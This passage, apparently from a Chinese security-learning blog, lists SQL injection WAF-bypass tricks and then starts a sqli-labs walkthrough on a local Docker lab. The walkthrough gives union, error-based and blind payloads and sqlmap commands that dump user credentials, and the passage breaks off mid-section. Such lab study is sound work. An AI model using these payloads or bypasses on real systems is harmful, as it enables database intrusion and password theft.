rlike</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() regexp <span class=\"string\">'^r'</span>; # regexp</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-14-双写绕过\"><a href=\"#2-14-双写绕过\" class=\"headerlink\" title=\"2.14 双写绕过\"></a>2.14 双写绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uniunionon seleselectct</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-15-二次编码绕过\"><a href=\"#2-15-二次编码绕过\" class=\"headerlink\" title=\"2.15 二次编码绕过\"></a>2.15 二次编码绕过</h3><p><code>-1 union select 1,2,3,4# </code></p>\n<p>第一次编码：</p>\n<p><code>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 </code></p>\n<p>第二次编码：</p>\n<p><code>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</code></p>\n<h3 id=\"2-16-参数拆分绕过\"><a href=\"#2-16-参数拆分绕过\" class=\"headerlink\" title=\"2.16 参数拆分绕过\"></a>2.16 参数拆分绕过</h3><p>对于a=[input1]&amp;b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了<code>union select</code>，可以使用参数拆分</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">'union/*&amp;username=*/select 1,user(),3,4--+</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-17-生僻函数绕过\"><a href=\"#2-17-生僻函数绕过\" class=\"headerlink\" title=\"2.17 生僻函数绕过\"></a>2.17 生僻函数绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> polygon((<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> @<span class=\"variable\">@version</span>) f) x)); # polygon()替换updatexml()</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-18-分块传输绕过\"><a href=\"#2-18-分块传输绕过\" class=\"headerlink\" title=\"2.18 分块传输绕过\"></a>2.18 分块传输绕过</h3><p>​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。</p>\n<p>​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(“\\r\\n”)。然后是数据本身，数据结束后，还会有CRLF(“\\r\\n”)两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。</p>\n<h3 id=\"2-19-信任白名单绕过\"><a href=\"#2-19-信任白名单绕过\" class=\"headerlink\" title=\"2.19 信任白名单绕过\"></a>2.19 信任白名单绕过</h3><p>WAF会自带一些文件白名单，可以利用白名单绕过</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">/</span>phpmyadmin?name<span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"keyword\">user</span>()<span class=\"comment\">--+&amp;submit=1</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-20-pipline绕过\"><a href=\"#2-20-pipline绕过\" class=\"headerlink\" title=\"2.20 pipline绕过\"></a>2.20 pipline绕过</h3><p>​\thttp协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，Apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。</p>\n<p>​\t用burpsuite抓包提交，复制整个包信息放在第一个包最后，把第一个包close改成keep-alive把brupsuite自动更新Content-Length勾去掉，有些WAF不会对第一个包的参数进行检测。</p>\n<h3 id=\"2-21-利用multipart-form-data绕过\"><a href=\"#2-21-利用multipart-form-data绕过\" class=\"headerlink\" title=\"2.21 利用multipart/form-data绕过\"></a>2.21 利用multipart/form-data绕过</h3><p>​\tmultipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>\n<h3 id=\"2-22-order-by-绕过\"><a href=\"#2-22-order-by-绕过\" class=\"headerlink\" title=\"2.22 order by 绕过\"></a>2.22 order by 绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">into</span> <span class=\"variable\">@a</span>,<span class=\"variable\">@b</span>,<span class=\"variable\">@c</span>,<span class=\"variable\">@d</span>; # 替代<span class=\"keyword\">order</span> <span class=\"keyword\">by</span>猜解字段数</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-23-修改请求方式绕过\"><a href=\"#2-23-修改请求方式绕过\" class=\"headerlink\" title=\"2.23 修改请求方式绕过\"></a>2.23 修改请求方式绕过</h3><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>可以更改请求方式尝试绕过。</p>\n<h3 id=\"2-24-大量字符绕过\"><a href=\"#2-24-大量字符绕过\" class=\"headerlink\" title=\"2.24 大量字符绕过\"></a>2.24 大量字符绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">select</span> <span class=\"number\">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>)<span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-25-花括号绕过\"><a href=\"#2-25-花括号绕过\" class=\"headerlink\" title=\"2.25 花括号绕过\"></a>2.25 花括号绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span>{x <span class=\"number\">1</span>},<span class=\"keyword\">user</span>(); # 花括号左边是注释的内容</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-26-union-select绕过\"><a href=\"#2-26-union-select绕过\" class=\"headerlink\" title=\"2.26 union select绕过\"></a>2.26 union select绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sel<span class=\"operator\">&lt;&gt;</span>ect # 程序过滤<span class=\"operator\">&lt;&gt;</span>为空 脚本处理</span><br><span class=\"line\">sele<span class=\"comment\">/**/</span>ct # 程序过滤<span class=\"comment\">/**/</span>为空</span><br><span class=\"line\"><span class=\"comment\">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class=\"line\">se<span class=\"operator\">%</span><span class=\"number\">0</span>blect # 使用空格绕过</span><br><span class=\"line\">sele<span class=\"operator\">%</span>ct # 使用百分号绕过</span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">53</span>eLEct # 编码绕过</span><br><span class=\"line\"><span class=\"keyword\">uNIoN</span> <span class=\"keyword\">sELecT</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">all</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">DISTINCT</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">null</span><span class=\"operator\">+</span><span class=\"keyword\">UNION</span><span class=\"operator\">+</span><span class=\"keyword\">SELECT</span><span class=\"operator\">+</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span><span class=\"comment\">/**/</span><span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">and</span>(<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">Select</span> <span class=\"number\">0xA</span><span class=\"operator\">*</span><span class=\"number\">1000</span>)<span class=\"comment\">/*!uNIOn*/</span><span class=\"comment\">/*!SeLECt*/</span> <span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br><span class=\"line\"><span class=\"comment\">/*!50000union*/</span><span class=\"comment\">/*!50000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!40000union*/</span><span class=\"comment\">/*!40000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">250</span>aunion<span class=\"operator\">%</span><span class=\"number\">250</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>caunion<span class=\"operator\">%</span><span class=\"number\">0</span>cselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>daunion<span class=\"operator\">%</span><span class=\"number\">0</span>dselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>baunion<span class=\"operator\">%</span><span class=\"number\">0</span>bselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class=\"line\"><span class=\"comment\">/*!12345union*/</span><span class=\"comment\">/*!12345select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*中文*/</span><span class=\"keyword\">union</span><span class=\"comment\">/*中文*/</span><span class=\"keyword\">select</span><span class=\"comment\">/*中文*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/* */</span><span class=\"keyword\">union</span><span class=\"comment\">/* */</span><span class=\"keyword\">select</span><span class=\"operator\">/</span> <span class=\"operator\">*</span><span class=\"operator\">/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!00000all*/</span><span class=\"comment\">/*!00000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"3-sqli-labs通关\"><a href=\"#3-sqli-labs通关\" class=\"headerlink\" title=\"3. sqli-labs通关\"></a>3. sqli-labs通关</h2><p>这里跟着<a href=\"https://www.sqlsec.com/2020/05/sqlilabs.html\">国光佬</a>学习</p>\n<h3 id=\"3-1-准备工作\"><a href=\"#3-1-准备工作\" class=\"headerlink\" title=\"3.1 准备工作\"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull acgpiano/sqli-labs</span><br><span class=\"line\">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>\n\n<p>中间可能报错，只需要关闭代理就行。</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error response from daemon: Head <span class=\"string\">\"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest\"</span>: Get <span class=\"string\">\"https://auth.docker.io/token?account=squarehhh&amp;scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&amp;service=registry.docker.io\"</span>: EOF</span><br></pre></td></tr></tbody></table></figure>\n\n<p>访问网页，环境搭建完毕。</p>\n<img src=\"/posts/31899/image-20250305014536324.png\" class=\"\" title=\"image-20250305014536324\">\n\n<h3 id=\"3-2-Less-1-20\"><a href=\"#3-2-Less-1-20\" class=\"headerlink\" title=\"3.2 Less 1-20\"></a>3.2 Less 1-20</h3><h4 id=\"3-2-1-Less-1\"><a href=\"#3-2-1-Less-1\" class=\"headerlink\" title=\"3.2.1 Less-1\"></a>3.2.1 Less-1</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"string\">\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());  </span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>联合注入</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库</span></span><br><span class=\"line\"><span class=\"string\">?id=-1'</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(table_name) <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>\"security\")<span class=\"operator\">%</span><span class=\"number\">23</span> # 查表</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=\"users\")%23 # 查字段</span></span><br><span class=\"line\"><span class=\"string\">?id=-1'</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(username,password SEPARATOR <span class=\"number\">0x3c62723e</span>) <span class=\"keyword\">from</span> users)<span class=\"operator\">%</span><span class=\"number\">23</span> # <span class=\"number\">0x3c62723e</span><span class=\"operator\">=</span><span class=\"operator\">&lt;</span>br<span class=\"operator\">&gt;</span>，即按换行分割</span><br></pre></td></tr></tbody></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">\"http://localhost:8888/Less-1/?id=1\"</span> --technique=U -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>报错注入</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23</span></span><br><span class=\"line\"><span class=\"string\">?id=1'</span><span class=\"keyword\">and</span> extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0x7e</span>))<span class=\"operator\">%</span><span class=\"number\">23</span></span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">\"http://localhost:8888/Less-1/?id=1\"</span> --technique=E -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>布尔盲注</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 # 有回显</span></span><br><span class=\"line\"><span class=\"string\">?id=1'</span><span class=\"keyword\">and</span> ascii(substr((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">68</span> <span class=\"operator\">%</span><span class=\"number\">23</span> # 无回显</span><br></pre></td></tr></tbody></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">\"http://localhost:8888/Less-1/?id=1\"</span> --technique=B -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>时间盲注</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;68,1,sleep(5)) %23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">\"http://localhost:8888/Less-1/?id=1\"</span> --technique=T -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"3-2-2-Less-2\"><a href=\"#3-2-2-Less-2\" class=\"headerlink\" title=\"3.2.2 Less-2\"></a>3.2.2 Less-2</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-3-Less-3\"><a href=\"#3-2-3-Less-3\" class=\"headerlink\" title=\"3.2.3 Less-3\"></a>3.2.3 Less-3</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=('<span class=\"subst\">$id</span>') LIMIT 0,1\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-4-Less-4\"><a href=\"#3-2-4-Less-4\" class=\"headerlink\" title=\"3.2.4 Less-4\"></a>3.2.4 Less-4</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=(<span class=\"subst\">$id</span>) LIMIT 0,1\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-5-Less-5\"><a href=\"#3-2-5-Less-5\" class=\"headerlink\" title=\"3.2.5 Less-5\"></a>3.2.5 Less-5</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in...........'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>不支持联合查询。</p>\n<h4 id=\"3-2-6-Less-6\"><a href=\"#3-2-6-Less-6\" class=\"headerlink\" title=\"3.2.6 Less-6\"></a>3.2.6 Less-6</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in...........'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式不一样。</p>\n<h4 id=\"3-2-7-Less-7\"><a href=\"#3-2-7-Less-7\" class=\"headerlink\" title=\"3.2.7 Less-7\"></a>3.2.7 Less-7</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=(('<span class=\"subst\">$id</span>')) LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in.... Use outfile......'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"You have an error in your SQL syntax\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>布尔盲注</strong></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 //正常回显</span></span><br><span class=\"line\"><span class=\"string\">?id=1'</span>))<span class=\"keyword\">and</span> ascii(substr((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">68</span> <span class=\"operator\">%</span><span class=\"number\">23</span> <span class=\"operator\">/</span><span class=\"operator\">/</span>报错</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>时间盲注</strong></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67,1,sleep(5)) %23 //不延时</span></span><br><span class=\"line\"><span class=\"string\">?id=1'</span>))<span class=\"keyword\">and</span> if(ascii(substr((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">68</span>,<span class=\"number\">1</span>,sleep(<span class=\"number\">5</span>)) <span class=\"operator\">%</span><span class=\"number\">23</span> <span class=\"operator\">/</span><span class=\"operator\">/</span>延时</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>outfile</strong></p>\n<p>这里因为提示<code>Use outfile</code>，因此可以尝试写文件。</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 